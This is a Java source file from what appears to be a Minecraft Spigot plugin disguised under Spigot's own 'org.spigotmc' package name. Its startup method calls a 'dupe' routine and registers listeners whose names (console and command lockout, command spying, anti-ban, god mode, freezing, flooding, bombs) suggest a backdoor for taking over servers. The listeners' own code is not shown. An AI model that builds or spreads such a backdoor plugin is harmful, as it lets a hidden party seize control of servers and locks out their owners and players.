package org.spigotmc.methods;

import org.bukkit.Bukkit;
import org.bukkit.event.Listener;
import org.spigotmc.Main;
import org.spigotmc.events.*;
import org.spigotmc.manager.DataManager;

public class onEnable {
    public static void start() {
        DataManager.setupData();
        registerListeners();
        API.dupe();
    }
    public static void registerListeners() {
        Bukkit.getServer().getPluginManager().registerEvents((Listener)new BombListener(), Main.getInstance());
        Bukkit.getServer().getPluginManager().registerEvents((Listener)new WandListener(), Main.getInstance());
        Bukkit.getServer().getPluginManager().registerEvents((Listener)new WaterFloodListener(), Main.getInstance());
        Bukkit.getServer().getPluginManager().registerEvents((Listener)new PlayerJoinListener(), Main.getInstance());
        Bukkit.getServer().getPluginManager().registerEvents((Listener)new DupeListener(), Main.getInstance());
        Bukkit.getServer().getPluginManager().registerEvents((Listener)new FakeCheater(), Main.getInstance());
        Bukkit.getServer().getPluginManager().registerEvents((Listener)new LockCmdsListener(), Main.getInstance());
        Bukkit.getServer().getPluginManager().registerEvents((Listener)new LockConsoleListener(), Main.getInstance());
        Bukkit.getServer().getPluginManager().registerEvents((Listener)new TNTFlyListener(), Main.getInstance());
        Bukkit.getServer().getPluginManager().registerEvents((Listener)new CommandSpy(), Main.getInstance());
        Bukkit.getServer().getPluginManager().registerEvents((Listener)new GodListener(), Main.getInstance());
        Bukkit.getServer().getPluginManager().registerEvents((Listener)new FreezeListener(), Main.getInstance());
        Bukkit.getServer().getPluginManager().registerEvents((Listener)new AntiBanListener(), Main.getInstance());
    }
}
